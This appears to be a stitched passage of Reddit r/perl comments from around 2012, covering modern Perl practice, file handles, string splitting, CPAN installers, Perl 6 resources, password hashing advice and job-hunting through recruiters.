I'd say: if they don't know Perl and are going to learn it, please teach them the new way, it's the only sensible and pious option! ;-) Once they know Perl and how to make great, modern, extensible and engaging programs, they will have naturally acquired the tools, experience and wits to dig into older, legacy code. Not all non-Modern Perl code is horrible, and there's probably a lot of state-of-the-art Perl 5.00503 or 5.6.1 code out there; probably also a (bigger) lot of PERL CGIs and write-only code... Once they know the modern way of programming in Perl, they will be able, eventually, to dig into one or another better prepared to survive the experience with mental sanity :-)
I think the problem with this approach - and I should write about this more extensively - is that those people need to do stuff right now with the codebase they have. They don't have time to first read about, practice and understand the new and nice and only then to go and fix the crappy code they inherited. The other thing is that if I teach them the new things they will go "who cares, I cannot use this".
It was less "unsure" and more "too lazy to fire it up and check it myself". :) But that's a cool trick, thanks for sharing.
If you're using anything earlier than 5.12, you're already on your own as far as support goes.
Could it be that simple?
I don't see it. Metacpan, CPAN, most of the posts with code on the Perl Ironman feed (with the notable exception of blogs.perl.org posts), have syntax highlighting on.
Definitely, I was just commenting on Perls overall image, it is seen as quite an old out of date language :/
throw a little ./build testcover in there, baby, you got a stew goin'
Learning Perl is a good book, but make sure you are using the current edition (which you probably aren't if it is an ex-library edition)
Also, I think people don't always appreciate how great TAP is. I gave a lightning talk on this at YAPC::NA this year about this. I brought up how you would extend jUnit to support a TODO test the way TAP does. (Talk doesn't seem to be posted to YouTube, so I'm feeling like I'm on the bad side of a warnock. Then again, Schwern's keynote doesn't seem to have been posed, either . . . ) [And here is how to do it](http://tech.groups.yahoo.com/group/junit/message/666). The author there actually says "I realize this seems a little nuts, but the point is there are enough hooks in JUnit as-is to implement this rather easily", thus proving the braindamage is complete in this one.
Here's a little personal secret of mine: I really like static typing. As long as it's entirely optional, and it doesn't have a lot of runtime penalty because it's optional. That is, I want both worlds: full dynamic typing when I it, full static typing when I want it. And while we're at it, I'd like to somehow run faster if I decide to go with some static typing. :) (And of course, mix and match inside the same program.) But given that I have to choose, I have (since 1993) always gone with dynamic typing. Static typing does give a false sense of security. 
Just to say that I don't intend to start a flame war with this link. I was looking at perl6.org and saw a link to a book that was supposedly "in progress" and thought it would be nice to read some chapters if any (I am aware of a different free book available but it has not been updated since 3 months it seems). Anybody knows if the specs of perl6 still fluctuate much now? (Perl6.org has too many links, no real info about the last update of each source, it's just confusing so perhaps somebody in the know could sum it up here) 
Feel-good articles :)
Expanding a bit on hyperforce's excellent pointers, one at a time: &gt; Use scalar filehandles instead of barewords (my $fh vs FILE) Do this: open(my $fh, $ARGV[0]) or die "No such file!\n"; Rather than this: open(FILE, $ARGV[0]) or die "No such file!\n"; &gt; Alias your argument to a semanatic scalar (my $file vs $ARGV[0]) This is still arguably not the right way to do command line option processing, but for something as simple as your example, it's fine to do: my $file = $ARGV[0]; open(my $fh, $file) or die "No such file!\n"; &gt; Drop the optional parenthesis in the open Like this: open my $fh, $file or die "No such file!\n"; &gt; Always use three argument open to specify that you are reading What if the filename has funny characters in it? Bad things could happen unless you use three-arg open like this: open my $fh, '&lt;', $file or die "No such file!\n"; One other thing to note is that there are other problems that can happen other than the nonexistence of a file. For example, you might lack permission to read the file, so this would be better: open my $fh, '&lt;', $file or die "Unable to open $file: $!\n"; The $! variable will contain the relevant error message from the failed call to open.
What're the issues with the first two points?
Excellent write-up!
Take a look at [my reply](http://www.reddit.com/r/perl/comments/y6qbp/any_way_to_type_file_name_in_shell_rather_than/c5su5pp). It may answer your questions.
Regarding file handles... I think barewords are forever/global while scalars are destroyed with scope. Keeping scope tight is important for maintainable code. Regarding the alias... It's just good form. Sure, you know today that arg zero is a file. But will you know tomorrow? Will the person reading your script tomorrow know that? Just because you can forego the creation of a temporary scalar doesn't mean you should. Don't get in the habit of writing Perl that looks like this (very frequent among beginners): $hash{key}{$dynamic_key} = join ', ', keys @{$complexObject{key}}[2 .. 4]
I'm curious about the third point. Outside of Perl golf, why does it matter? I actually prefer to keep them in as I think it helps readability.
Refer to [perldoc perllexwarn](http://perldoc.perl.org/perllexwarn.html). 
True, I am plenty comfortable with CSS and Photoshop but those areas don't interest me!&gt;&gt;I think it is mostly because Perl hackers don't tend to be front end developers as well. &gt;Definitely. Or that they are perfectly competent front-end developers but they consider that kind of thing as an implementation detail, maybe a bit beneath their notice. 
Ignore the code criticisms. In perl, there is more than one way to do it and there is nothing wrong with how you did it. The criticisms are this particular developer's coding preferences. BTW: Somebody below mentioned the diamond operator. It's probably your best route as there is no need to explicitly open files and it will automatically read from STDIN should you pipe something into it. It can also take multiple files on the command line automatically. But then that's my personal preference. while (&lt;&gt;) { # Do something useful } EDIT: Added writeup on diamond operator
Thinking that all code is equally okay is part of the problem that pervades "old" Perl. There is more than one way to do it, but one is probably better suited than the other. If you think the criticisms are mere preferences, I'd love to see your code.
&gt; This is the only one that has some merit. It does improve readability. If you get filenames from user input, the three-argument open also has better security.
I'd probably use some kind of Finite State Machine. So you have a variable, `$state`, which tells you what kind of block you are in, and a switch statement that tells you how to parse it. So if you are in state `DEFAULT` and you encounter a `Company:` line, you switch to state `COMPANY` until you encounter a line ending in a colon. Be careful you don't end up with a huge unreadable block of code though, you should be able to break the actual contents of the `switch` into separate subroutines.
As a subroutine: # -------------------------------------- # Name: undef_to_empty_string # Usage: undef_to_empty_string( @array ); # Purpose: Convert undef in an array to an empty string # Parameters: @array -- Array to modify. # Returns: (none) # sub undef_to_empty_string { defined or $_ = '' for @_; return; }
Because it doesn't help readability; it just makes it harder to spot places where you've used parentheses because you *actually* need them.
`use warnings` enables warnings for the code that declares it. `-w` enables all warnings for *all* code (outside of a `no warnings` declaration), including third-party modules.
YAML was my first thought as well. However, after checking the YAML syntax in YAML.pm's perldoc, I'm not sure it'll work. It looks like multi-line scalars in YAML require a signifier rather than being implicit like in the OP's example. I suspect it would be a lot easier to go with egw's idea of a simple, hand-coded parser rather than trying to find an overly tolerant YAML parser or munging it into a YAML-friendly format.
First, I very strongly recommend visiting the [IRC channel #perl6 on freenode](http://webchat.freenode.net). It's very newbie friendly and typically plenty active between about 7am and 7pm EST. If you already know Perl 5, I strongly recommend: * Moritz's [Perl 5 to 6](http://perlgeek.de/en/article/5-to-6) blog series. He wrote them 2-3 years ago, but has kept them more or less up-to-date. (If you find a problem, please let him know.) * Szabgab's [Perl 6 Maven](http://perl6maven.com/) site. Gabor got in to Perl 6 a few years ago and created some learning materials. Then he paused and returned his focus to Perl 5 for a couple years. Recently he got fired up again about Perl 6, created the Perl 6 Maven site, and has been adding material for about a month so far. Other material I recommend: * The advent calendars (links on [perl6.org/documentation](http://perl6.org/documentation/)). The quality of the advent entries varies a good deal but many are gems in terms of quickly introducing major aspects even if the details are off due to spec tweaks. * The [rosettacode examples](http://rosettacode.org/wiki/Category:Perl_6). These are mostly high quality. Many have been created by Larry Wall, who continues to add more. (Around 450 to date.) * [doc.perl6.org](http://doc.perl6.org). Moritz began this a couple months ago. Imo it's the near term future of Perl 6 end-user documentation. * [Synopses](http://perlcabal.org/syn/). This is the Perl 6 "bible" and it's usually definitive on what's supposed to happen. (You should also check implementations (most simply by using eval bots on the #perl6 IRC channel), check the compiler test suite, and ask on #perl6.) * Most Perl 6 [articles and presentations by jnthn](http://www.jnthn.net/articles.shtml), moritz, masak, and pmichaud are excellent and still very relevant. Finally, fwiw, [re: too many links](https://github.com/perl6/perl6.org/issues/3#issuecomment-7669620).
I do follow the spec process closely. I just upvoted marvin_sirius' above comment (i.e. I agree).
That's not how it should work. It should know the required deps for what you are installing and ask about them all the way down, not barf on them. Errors from stuff that you are not installing is different. Yes, I realize it is testing something that you are installing, but the thing that is failing seems to be part of the tester (perl and CPAN) not the testee.
Why is CPAN so fucking complicated for what it does? I can download a whole fucking operating system with one click. All I want to do with CPAN is download a simple text file, and it goes gaga!
Probably not the example he's thinking of, but I recently tried to install Dist::Zilla using the normal CPAN client and it got stuck on a circular dependency in some fairly common modules (File::something). Instead of recognizing that it's already installing the module that depends on the module that depends back on the original module, it just gave up and died. It was literally impossible to install the module using it. cpanm just did it, and didn't prompt me for 50 inane questions with obvious answers.
Don't follow it, use it for programming. That's the only good way to learn any programming language.
[Throwable](http://search.cpan.org/perldoc?Throwable) See http://www.youtube.com/watch?v=yGwFGqrHrlc or http://www.slideshare.net/genehackdotorg/code-fast-die-young-throw-structured-exceptions-13313567
A lot of people in the Perl community think so too. And a number of Perl sites have been getting makeovers over the last couple of years. See, for example, http://www.perl.org/. I'm one of the team that runs blogs.perl.org (where a couple of the blog posts listed in the original article are published). We'll look into adding syntax highlighting as soon as possible.
Sounds like a pretty poorly-formed question. Who would even ask that? The answer is pretty much "ask a different question."
Thanks for being such an obvious troll. Your first comment sounded serious, but this one along with your post history made it clear.
Must've been an old version of CPAN, because the client i currently use warns about bad or missing deps, but tries to run the tests and install anyways. What is your version of CPAN.pm?
I have never written a line of Perl in my life but I do technically meet most of the requirements to be in the Perl community no less the inner circle.. This may need some work still...
Larry Wall
It says there are 5,902 of us, but I see only six. 
Just admit it, you can't weasel your way out. You're more a part of the community than some people I work with who've written a million lines of code :)
Yeah. The level of evolution has been both awesome and confusing. Moritz++ is currently very rapidly building out the all new [doc.perl6.org](http://doc.perl6.org). He is pretty much only documenting what he knows is current and stable.
Two people unsubscribed since you said that. ...way to go. &amp;#3232;\_&amp;#3232;
Im reading the book that goes up to 5.14, so a good portion of that will be removed? 
The question is: can a veteran Perl 5 programmer switch to Perl 6? Or more precisely, is there a reason to learn to use the new toys when the old ones are quite good?
The doc.perl6.org seems interesting (what is with "_" vs "-" subs?)! Thank you for your reply! 
Thank you! This is the closest answer to my question!
If it is only going to be used a few times a day you could do: if(/=/){ #matches "hello = good" print $'."\n"; #prints " good" (You could change match to: /=\s/ if you expect whitespace) The special variable $' prints everything after the match, however, if you plan on using this script a lot, then you should consider a workaround because this can prove to be inefficient (only milliseconds difference though) This is untested by the way, the variable could be $` also, but from what I can remember that variable prints what is before the match ($&amp; prints the match if you are wondering). EDIT: Fixing the code
Yep i neglected to mention that, sorry! 
split is probably the function you want, splits a string into an array of elements that were separated by a delimiter regexp: my @columns = split /\s*=\s*/, $line, 2; or you can use: my ( $junk, $phrase ) = split /\s*=\s*/, $line, 2; edit: Updated with mp_at_work's correction below.
This is my favourite approach. Keep things as simple as you can.
clamdiggin has the best answer with index &amp; substr. However, if you use split, you should provide the optional LIMIT arg in case the right hand side contains '='. $ perl my $line = 'a = b = c'; my $phrase = ( split /=\s*/, $line, 2)[1]; print "$phrase\n"; ^D b = c $ 
And you have `perldoc` on your system, too. Do `perldoc perlre` from the command line to see the `perlre` manual page. Do `perldoc -f substr` to find docs on the `substr` function. Do `perldoc -q whatever` to search the Perl FAQ for `whatever`. Do `perldoc Module::Name` to see the docs for a given module.
Oh wow, thanks so much; this resource seems invaluable to a newbie like me.
Yep, I'm so used to using -1 as the third arg to split that I clean forgot that the positive value meaning is exactly what I needed here, thanks for the catch. I dispute that index and substr is the "best answer", if only because every time I've had to debug other people's code making use of index and substr for slicing up strings, it's a rat's nest of off-by-one errors.
There's some good advice in this thread already, but nobody's addressed the issue of why your regex solution only prints "good", so I thought I'd mention that. And that's simply because you have "(\S+)" after the =, which means "1-or-more of any **non-whitespace** character", but you have spaces in the text you're trying to match, which is why you get everything up to the first space. To fix that you could simply use "(.+)" instead, i.e. if ( /(\S+).=.(.+)/ ) Then you might want to make it more flexible about space surrounding the = if ( /(\S+)\s*=\s*(.+)/ ) But really, you're probably better off with index and substr for this particular problem, as in clamdiggin's solution. 
Parrot is not Perl 6, any more than .Net or Haskell are Perl 6.
This is may be exactly what you want, but without code it's hard to say what you mean. Another thing you could try is Data::Dumper to dump the contents of your object. 
It's Vim's :TOhtml mode, slightly edited for the color scheme.
Thanks. It looks like vim, which is why I asked. I'd like to be able to incorporate this into documentation for a Catalyst application I am writing. 
&gt; dedicated to piers cawley Oh fuck. What happened to Piers that I don't know about? Hmm... nothing it seems. He's [still alive](https://twitter.com/pdcawley) or at least, he was 4 hours ago. You had me worried there.
I think "dedicated to" is for living entities and "in memory of" or somesuch is for those not living. Someone please let me know if I need to change the title!
Thank you for your original comment and reassurance that Piers is alive and kicking, in case anyone else misinterpreted it the same way. And thank you for your follow up to me. For now I'll leave the title as is.
 Sigilless variables? This is a thing? 
Hi, I wrote the summary above. Because I've come to like reddit's features (posting, commenting, voting, moderation), and I don't want to unduly fragment conversation and voting by posting this content on a blog or whatever, I've only posted this content to reddit. Do you think that's smart? Or should I post elsewhere instead and just post a link here?
I thought the same and it freaked me out! I agree with raiph's distinction but still... jeez that would have been a bummer.
It kind of turned me off Perl 6's community actually, it's everywhere! Surely mentioning their name is recognition and kudos enough?
Don't worry too much. Just put a note at the top of the text explaining what you mean and maybe why he deserves it.
I was not referring to your post, but thanks!
sorry, I meant Radudo (see link below).
FWIW, I also thought that something had happened to him from the title.
Note that the variables part wasn't developed in a branch, right in nom. Only the parameters were done in a branch. So you can now say my \x = foo(); and `x` does not force any context on the return value of `foo()`
Here's two ways. Whenever you see a repeated pattern like that you probably want to think about storing in an array my $fabcode=4; my @array = qw/ xx xx II III IV V VI /; print "$array[$fabcode]\n"; or in a hash my $fabcode=4; my %hash = ( 2=&gt;'II', 3=&gt;'III', 4=&gt;'IV', 5=&gt;'V', 6=&gt;'VI' ); print "$hash{$fabcode}\n"; Of course you want to check $fabcode is within bounds.
What do you think modules are? They are (for the most part) vanilla Perl. Even if you don't want to install a module, you can always take the code out of one (but this is a really bad idea since you can't receive updates and you run the risk of breaking something). For instance, the first hit in the search shawnhcorey gave you is the [`Roman`](http://search.cpan.org/dist/Roman/lib/Roman.pm) module. [In it](http://cpansearch.perl.org/src/CHORNY/Roman-1.23/lib/Roman.pm) we can see the code it uses to convert a number between 1 and 3999 to Roman numerals: my %roman_digit = qw(1 IV 10 XL 100 CD 1000 MMMMMM); my @figure = reverse sort keys %roman_digit; $roman_digit{$_} = [split(//, $roman_digit{$_}, 2)] foreach @figure; sub Roman($) { my $arg = shift; 0 &lt; $arg and $arg &lt; 4000 or return undef; my($x, $roman); foreach (@figure) { my($digit, $i, $v) = (int($arg / $_), @{$roman_digit{$_}}); if (1 &lt;= $digit and $digit &lt;= 3) { $roman .= $i x $digit; } elsif ($digit == 4) { $roman .= "$i$v"; } elsif ($digit == 5) { $roman .= $v; } elsif (6 &lt;= $digit and $digit &lt;= 8) { $roman .= $v . $i x ($digit - 5); } elsif ($digit == 9) { $roman .= "$i$x"; } $arg -= $digit * $_; $x = $i; } $roman; }
You can't use third-party modules in homework assignments.
It is the default, and the default has always been at least 'ask' Looks like OPs setup was set to ignore: ... Please set your policy to one of the three values. &lt;prerequisites_policy&gt; Policy on building prerequisites (follow, ask or ignore)? [follow] ... 
MNP, you're right, I don't want dependencies. I want all the code in in one single .pl file. Well, to be honest, I have one library file, with routines that are used all over the place. So, in my case, I update 2 files: the main program and my library file, which rarely changes. 
You're using PowerShell baby talk. Just like Perl, there's more than one way to do it. select-string -q -ca "Failed" c:\scripts\test.txt That will do the same thing as your longer PowerShell example. But you probably meant to omit "-casesensitive" since you are using case insensitivity in your grep example, and select-string is case insensitive by default. I've also shorted the options to the least number of characters that's unambiguious. If select-string is too long to type, make an alias. You can stick it in your profile so it's always available when you open a new shell. new-alias grep select-string grep -q -ca "Failed" c:\scripts\test.txt &gt; Windows users are still a long way away from having something as good as grep or ack. I trust your comments about Modern Perl, but you don't sound like you are qualified to comment on the quality of tools available on Modern Windows. Several messages prior to this you didn't even know its built-in grep-like functionality existed. Grep and ack are great if all you need to work with is files. However, Windows doesn't revolve around text files like Unix does. On Windows, the shell can use addons called PowerShell Providers which allow one to connect to a data store as if it were a mounted drive. I can cd into a database schema, a LDAP store, the Windows registry, or whatever the provider supplies and manipulate the data inside. I can "cat" or "less" a database table. I can cd into Active Directory and grep against my LDAP schema. Since everything in PowerShell is an object, as opposed to plain text like in the Unix shell, I have a lot more control over how I filter things than just a grep-like string search. I can even send output to a non-powershell command, like a Perl script, and it'll do the right thing and convert it to plain text. In fact, I do just these things each week for the Windows servers I administrate at work. Please don't make the mistake of thinking Windows users are somehow suffering because we don't have some particular tool installed out-of-the-box. Windows users can still download and install grep, ack, and other things if they need them. Everyone has to install extra software on their computers at some point. Even out-of-the-box Perl doesn't come with everything I want or need. I always have to install a handful of CPAN modules on each new system I use. I can understand how people might not like Windows if they come from a Unix background and expect that it will be the same. Don't do that. Throw out your expectations and accept it for what it is. If it's hard to do your work on Windows, then it's not the best tool for your job. Choose a different tool. With PowerShell, Strawberry Perl, and Vim, I have little to complain about.
This is pretty cool, but seems to me like you're shooting at a fly with a bazooka. Why use all the modules when you can simply tail and grep the access log for user agents?
I would probably recommend *Learning Perl* ( http://www.amazon.com/Learning-Perl-Randal-L-Schwartz/dp/1449303587/ref=sr_1_1?ie=UTF8&amp;qid=1345526524&amp;sr=8-1&amp;keywords=learning+perl ) or *Modern Perl* ( http://www.modernperlbooks.com/mt/index.html ). Getting used to using the perldoc command, it is very helpful. `perldoc perldoc` is a great place to start.
The thing is it was published in 1999. :/
Modern Perl is a good instruction book that is up-to-date in style and best practices. Learning Perl is excellent and has a long tradition, but I don't think it's as current in style and practices. Effective Perl Programming is good, but I don't see it as a training manual. The documents that are included with perl are free, and already on your computer, so very useful.
1) Look up Modern Perl. Live it, love it, know why it is important. 2) Keep asking if your Perl is "Perl-ish" enough. It's really easy to write Perl as if it was some other language because it is flexible to a fault. Don't write C-Perl, don't write Java-Perl, write Perl Perl.
find a perl mongers group and go along for the meetings. edit: [link](http://www.pm.org/)
Thanks a tonne! I had seen that with Getopt::Mixed in a perlmonks post from 2001 and didn't know it applied to Getopt::Long. Thanks again!
Let me test your powers of prophecy... Will it rain today? I put your comment in www.cleverbot.com and this is the response it returned.
Well that was about the dumbest bot comment ever. :P
Also, you can create a spidertrap on your site with a visibly hidden URL, something a user wouldn't normally stumble into, to further try and identify bots that don't explicitly announce themselves as such.
Thanks so much. I hadn't imagined seeing it on CPAN, see original post.
*Programming Perl* 4th Edition was just revised Feb 2012. I'm in the same position as OP and I have found both Modern Perl &amp; Programming Perl great resources along with asking smart people who already know Perl to review my code. I think your worst enemy is strictly reading. You should have a text editor at the hand when reading, and after learning about an idea immediatey make a small toy script to show what you've learned. Name them something close to what they're doing (inputandoutput_stdin.pl for example). This is for you to go back and read, don't use names like "stuff01.pl" or "test.pl". Now when you need to rethink about a concept you can go to your code example and immediately see it. You should be filling up your gist on github.com (or something similar) with code snippets and asking people to review things you don't understand. With any task, but especially a skill like programming, there is absolutely no substitute to "seat time". It may take you one excercise or twenty to get a concept, but if you implement what you're reading about, however trivial it may feel now, it will allow you structure and implement harder concepts that have otherwise been too large to conceptualize. Go at your pace, and keep it fun. Also: your programs should all have: use strict; use warnings; On all programs for now! Learn it the hard way, you'll be a better person for it.
Last year, the Perl 5 stalwart Merijn "Tux" Brand said ["perl6 has definitely lost a user: me."](http://perlmonks.org/?node_id=880371). But, as I think will be true of most smart and open minded coders, the right sort of exposure to Perl 6 as it is today turned him from someone who actively disliked the language to an enthusiastic optimist. (Edit: fix typo)
&gt; We'll look into adding syntax highlighting as soon as possible. Not sure if you've recently added it, or have been encouraging folks to use what's there, but I can see it starting to appear! Not crazy about the snippets in some blog posts that are supplied by gists (since they have that big github message at the bottom of every code snippet box), but I'm liking [the others](http://blogs.perl.org/users/mark_stosberg/2012/08/thanks-to-olaf-alders-for-httpcookiemonster.html) (maybe lighten the code snippet box border a bit though). :) 
Sounds like a good, simple idea.
I was confused, by 'empty' you mean 'empty list'. That's the only way you can get an odd number of elements out of that code. You have a few possible solutions... * fix the sub so it always returns something besides empty list * force scalar context on the sub call (which may have side-effects if your sub uses *wantarray*) b =&gt; scalar(frobber()), * sort of the same, but possibly clearer... b =&gt; (frobber() or undef), b =&gt; frobber() || undef,
The easy way, if you can't guarantee consistent return values from the subroutine is: my %dict = ( a =&gt; 1, b =&gt; frobber() // undef, c =&gt; 3, ); If you're pre Perl 5.10, you don't have // so it's a little harder to write the defined test. Generally, I don't like to call subroutines in hash assignments, for just this reason. They're getting implicitly list context when you quite possibly want scalar, and that's an instant jump into the parts of perl that make you think. And this isn't hard enough code to want to have to think about
I'm not talking about solutions to the code, I'm talking specifically about a change to the interpreter for more helpful error messages. Sorry, I wasn't clear originally.
&gt; ... the fat comma should be smarter than a comma. It is, but only at parse time. &gt; If the "right side" of a fat comma also is a "left side" to a different fat comma, then there should be an error. You want to add a new op that's like a comma, but is an infix operator that checks its operands for ... well, it has to detect whether they existed before the comma operator took effect, which means you have to change how the comma operator works too. I can't even imagine how to write such a thing such that you can get the precedence correct, to start. Worse, you're trying to deduce the existence of something which in all truth doesn't exist. Essentially you turn the fat comma into an op which says "There may be an expression following, so evaluate that expression, remember that there was an expression there, and if that expression returned nothing, raise an exception, unless there's another expression following that which is one of several special cases which can produce sufficient elements to make the list of the parent expression which this is part of into an even list." I can't decide which parts of that op operate at which points during the evaluation of a whole slew of expressions; I think it has to operate at multiple points of evaluation. That seems unlikely.
Unlikely but helpful. Like how does the code for runaway string work? It's a much more helpful error message than BLAH BLAH PARSING ERROR taken literally. That's what I'm trying to aim for here, something more helpful than "why does this visually even hash parse as uneven" oh wait I coded a horrible function that returns an empty list at line 3".
&gt; Like how does the code for runaway string work? At parse time. That's a very important distinction.
&gt; my %dict = ( 'a', 1, 'b', frobber(), 'c', 3 ); This still has the problem of having an odd number of elements if `frobber()` returns an empty list.
When you put words in quotes and claim someone else said them, it's generally polite to include only words that person actually said.
&gt;But, as I think will be true of most smart and open minded coders So those that don't agree are....?
And on GMANE (with keyboard navigation): - [fixing ~~ harder. a lot harder](http://thread.gmane.org/gmane.comp.lang.perl.perl5.porters/96521) - [fixing smartmatch just hard enough (and when, too)](http://thread.gmane.org/gmane.comp.lang.perl.perl5.porters/112906) - [Chiming in on the smart match debate](http://thread.gmane.org/gmane.comp.lang.perl.perl5.porters/113158) - [Why smartmatch](http://thread.gmane.org/gmane.comp.lang.perl.perl5.porters/113200) 
While GMANE has a much nicer interface, i must caution that it picks up on a lot less emails belonging to the threads than nntp does. Thanks for pointing out the first thread though, i missed that one.
I was fully prepared for this to be another "much better than before, but still pants" kind of redesign, obviously done by non-designers. I was glad to find that it is actually quite nice. Of course it's not perfect (nothing ever is). I hope they accept pull requests :)
You and me both. :(
I was considering going to the SF.pm, but then I looked at the [map](http://i.imgur.com/P6iVM.png).
just under the map you get instructions how to submit better coordinates.
Yes, I saw that. I found it amusing nevertheless.
Amusingly enough, a patch recently went into blead that makes `if (%hash)` go from being the slowest by far for a full hash (10-20x slower in this benchmark) to being the fastest (50% faster than `if (keys %hash)` and friends).
After the earthquake?
It is the unreleased bleading-edge version of Perl that the core developers work on until the next release is made.
Why is it still so slow when testing the empty hash? "if defined %hash" is still consistently fast in all cases but is deprecated. 
Except useful.
Sounds like a good idea for a CPAN module. :-)
You should rotate it 90° :)
I don't understand why would they require participants to use VMware.
This doesn't answer your question (I've never dealt with recruiting agencies before) but where are you looking for work?
Keep applying - that's the only way to get interviews, but stay mindful that a recruiter should know the nuance of the role and team, so sometimes you are lacking other requirements. Right now I've got an OO Perl need but it also requires strong experience with LDAP/Active Directory, so many of the applicants I get have the wrong blend of skills and I don't have the time to respond individually.
Yep- they want a big stack of resumes on file so that they offer some value to companies that are hiring (i.e. potential earnings for them if they can match you two up).
Sometimes true. You have two kinds of agencies. The resume whores...like you mentioned, and the ones that have a good position and a good relationship with the people offering it. The second type of agency is usually the one you want. They know what they are doing more of the time. The others are just throwing shit against a wall all day to see what sticks.
No. Recruiters are trying to fill jobs to earn commissions. If they don't have a job for you, or cannot imagine one coming available soon, they're going to move on to a different candidate as fast as they can. Don't take it personally. I would be more concerned that your resume isn't showing you in the best light. Most resumes end up looking the same and not really calling out the exceptional skills and experience you may have. Having said that, recruiters seem to be keyword driven and ignore or don't understand anything you write that's longer than a four-letter acronym.
Passwords can be tricky to do properly so I would suggest reading up some, [here's a link] (http://throwingfire.com/storing-passwords-securely/?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+throwingfire+%28Throwing+Fire%29#notpasswordhashes) from a while back. Although the article talks python a lot of the concepts are the same, and you'll probably end up using something like [this] (https://metacpan.org/module/Digest::Bcrypt). I wouldn't put too much stock into what your friends say about a language they don't/haven't used, so I would just say: never stop learning and you'll be fine. By the way, perl has [moose](https://metacpan.org/module/Moose) which I highly recommend checking out if you're wanting to do some object-oriented programming with perl. 
Second question first: It does not matter much what your first programming language is. What matters is your second, third and forth languages. There are some pretty good articles about hashing for passwords vs hashing for other purposes. The main thing when hashing for passwords is to add a bit of random "salt". This is done to ensure that identical passwords don't always hash to identical strings. 
There is hashing and there is encryption. Encryption preserves all of the input information and it can be reversed. Hashing creates a small "fingerprint" of the data and will always give the same "fingerprint" for the same input, but it doesn't preserve the information. Password hashing and cryptographic hashing are the same thing. Md5 is fast, which means an attacker can try a lot of inputs cheaply. This means md5 is unsuitable for security. For hashing a password, you need a hash function which is *slow* on purpose. Preferably one which has a *work number* that means you can increase the time it takes in the future, to keep up with faster computers. For password hashing you should always use bcrypt or pbkdf2. Perl is a complex, multi paradigm language which includes support for object oriented programming. Perl can't be compared to an academic language, since Perl is the only mainstream language which is implementation defined, which means there is only one implementation and no spec. (by definition, any alternative implementation would not be Perl, even if it was very close.) This makes Perl a very hackable platform, and one which has new features appear often. This is why Perl has the largest and most robust collection of reusable code of any language: CPAN. You can't judge Perl just by it's semantics, you have to include CPAN.
There is a password hash that *uses* MD5 (glibc crypt `$1$` and similar) that's often simply referred to as "MD5". The same for SHA-256 (glibc crypt `$5$`). Neither is just the "plain" cryptographic hash with the same name, but these two password hashes don't have names of their own, so they're hard to refer to. It's confusing and a little bit dangerous, so watch out for it. What you get if you use Digest::MD5 or Digest::SHA is *not* a suitable password hash. What you get if you use `crypt()` (with a suitable libc and suitable arguments) is a good password hash. What you get if you use Crypt::Eksblowfish (bcrypt) or Crypt::PBKDF2 (incidentally written by me, but use bcrypt instead if you can) is a good password hash. What you get if you use Crypt::SaltedHash is a *tolerable* password hash (actually just a crypto hash but at least it's salted, and the module has a decent interface). As for the other question... Perl is perfectly capable of OO, and actually some of the object metaprogramming things you can do pretty easily in Perl aren't even *possible* in more popular languages. The only things are that Perl doesn't *force* OO on you, and that core things like numbers and strings don't act like objects in Perl (but see autobox and Moose::Autobox for an interesting answer to that). As for the last question, I have no idea what a "computer engineer" actually does. I'm a working programmer and OO is definitely relevant to me. Whether it's relevant to you depends on what definition fo "engineer" is in play here.
that is a good observation, but I have noticed that recruiters most of the time ask for too much qualification from a wide array of skills.So if someone has some or most but not all should he apply? What if you can't find the candidate that has all, do you compromise? or why not hire and train?
true, I find misspelled postings hastily written and especially when you see capitalizing Perl to PERL you know that those guys don't know what they are talking about
Yes they can be trustworthy, I've found most of my jobs via recruitment agencies and have used them to fill positions too. They can vary wildly in quality however, and it depends on country and region. If you want best results, use a specialist agency that only deals with IT recruitment, and one that's local to your region/city: they're going to find stuff for you that the big agencies won't. You don't want to rely just on an agency like that though, you should make sure you're registered with the big agencies too and whatever job-finding sites are relevant to your situation. As for no reply, that's par for the course in job-hunting: you won't get around to rejecting every inquiry that comes your way and they won't get around to rejecting every inquiry that you send. It's not the most polite way of doing things, but it's an inevitable fact of how things work... get used to it and don't take it personally. Also bear in mind that lots of agencies have a huge backlog, it's not uncommon to send off your CV, hear nothing from them, then a month later when you've worked your way to the top of the pile they'll send you six interview offers on the same day. I've had agencies be so slow off the mark that I've already found a job and been there a month or two before they started sending me stuff.
&gt; Ruby mostly does. Actually, no. [Ruby is an ISO standard now.](http://www.iso.org/iso/iso_catalogue/catalogue_tc/catalogue_detail.htm?csnumber=59579)
Your friends would be well-advised to get over that bigotry, lest they spend the rest of their days as IDE monkeys in a dark cubicle farm.
Perl is a powerful, dense language. It is easy to develop powerful programs with relatively few lines of code, especially compared to C or Java. Perl is designed to make it easy for a programmer to write code quickly. For example, I work for a stock broker. We received data from stock exchanges around the world, and need to load it into data bases overnight, perform some calculations. Data suppliers have a tendency to alter data formats without notice. You can't wait a week or a month for a Java program to be altered, the loader needs to be modified and running ASAP, ideally before the market opens. Some people write ugly Perl, because they can. They would write ugly code in any language, it's the programmer, not the language. You can write beautiful Perl if you want to. You should want to. Writing programs is cool, and at 14, 15 you have a lot of stuff to learn about programming. But keep an eye on Software Engineering concepts, such as creating routines that implement a concept, gathering routines that deal with related items into a module, and so on. Perl does OO, there are simpler, traditional systems using 'bless'-ed hashes, and a newer system involving Moose and it's 500 associated modules. But you don't have to do OO, there's lots of interesting stuff you can do with plain routines, and OO isn't always an appropriate solution. Don't forget that Perl regular expressions are the most powerful in any language. Other languages have long looked to Perl as a standard to aspire to, and recent changes have made regex even more powerful. The regex in Perl6 go even further, implementing a full grammar system. 
Watch out for the "one true language" guys. They're afraid of the big, wide world and trying to hide in the corner. These sorts of attitudes lead you to being a 60 year old COBOL programmer. A lot of Perl programmers only do Perl, but they admit that they do it because it's what they happened to have learned and they have a good job doing it, not because it's the one true language. The people who have been doing Perl the longest and have done the most hacking with it are, perhaps ironically, the least religious about it. They care about Perl, but they know a dozen languages and don't care for these sorts of religious wars. When audreyt started writing pugs (an experimental Perl 6 interpreter) in Haskell, a lot of Perlers became curious about Haskell and set out to learn it. Haskell is a very different language from C/Python/Ruby/VB/Java/etc and learning it quite rewarding. It broadens how you think. When the ICFP contest came around this year, I created my entry in SNOBOL, a language that was far ahead of its time and despite not being "structured" (no while or if constructs or the like -- this was a radical invention at one point) has a huge amount of Perl in it and even several things Perl hasn't gotten around to yet. SNOBOL has the best string matching first-class datatype/system out there, to this day. As far as OO, Perl has the basics: polymorphic dispatch, inheritance, instance data, and so on. You can have a lot of fun with OO in Perl because Perl likes to "expose the ductwork". You can create classes on the fly from 